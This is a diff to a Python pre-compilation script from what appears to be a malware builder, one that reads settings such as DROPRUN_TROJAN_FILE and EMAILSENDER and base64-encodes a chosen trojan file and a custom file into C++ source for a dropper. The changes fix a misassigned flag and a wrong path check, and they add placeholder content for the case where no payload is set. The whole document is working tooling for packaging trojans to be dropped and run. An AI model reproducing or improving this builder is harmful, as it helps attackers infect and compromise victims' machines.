@@ -11,7 +11,7 @@ for line in open('../commons/common.h', 'r').readlines():
     if '#define EMAILSENDER' in line:
         emailSenderLastPath = line.split('"')[1].replace('\\\\', '\\')
     if '#define DROP_CUSTOM_FILE' in line and 'true' in line:
-        emailSenderLastPath = True
+        CUSTOM_FILE = True
     if '#define DROPRUN_TROJAN_FILE' in line and 'true' in line:
         DROPRUN_TROJAN = True
 
@@ -126,21 +126,25 @@ for line in main_cppRead.readlines():
             content += '"'+subContent+'"\n'
         content += ';\n'
         continue
-    if line.split('=')[0] == 'string CustomFileContent ' and line.split('=')[1] != ' \n' and CUSTOM_FILE:
+    if line.split('=')[0] == 'string CustomFileContent ' and line.split('=')[1] != ' \n':
         content += 'string CustomFileContent = \n'
         customFilePath = line.split('"')[1]
-        checkFileLocation(customFilePath, i)
-        customFileContent = base64.b64encode(open(customFilePath, 'rb').read()).decode()
+        customFileContent = base64.b64encode('nothing to read here :) - Tuga'.encode()).decode()
+        if CUSTOM_FILE:
+            checkFileLocation(customFilePath, i)
+            customFileContent = base64.b64encode(open(customFilePath, 'rb').read()).decode()
         open('preCompilation.tmp', 'a').write("customfile=" + customFilePath + "\n")
         for subContent in split_str(customFileContent, 500, False):
             content += '"'+subContent+'"\n'
         content += ';\n'
         continue
-    if line.split('=')[0] == 'string TrojanFileContent ' and line.split('=')[1] != ' \n' and DROPRUN_TROJAN:
+    if line.split('=')[0] == 'string TrojanFileContent ' and line.split('=')[1] != ' \n':
         content += 'string TrojanFileContent = \n'
         trojanFilePath = line.split('"')[1]
-        checkFileLocation(customFilePath, i)
-        trojanFileContent = base64.b64encode(open(trojanFilePath, 'rb').read()).decode()
+        trojanFileContent = base64.b64encode('nothing to read here :) - Tuga'.encode()).decode()
+        if DROPRUN_TROJAN:
+            checkFileLocation(trojanFilePath, i)
+            trojanFileContent = base64.b64encode(open(trojanFilePath, 'rb').read()).decode()
         open('preCompilation.tmp', 'a').write("trojanfile=" + trojanFilePath + "\n")
         for subContent in split_str(trojanFileContent, 500, False):
             content += '"'+subContent+'"\n'
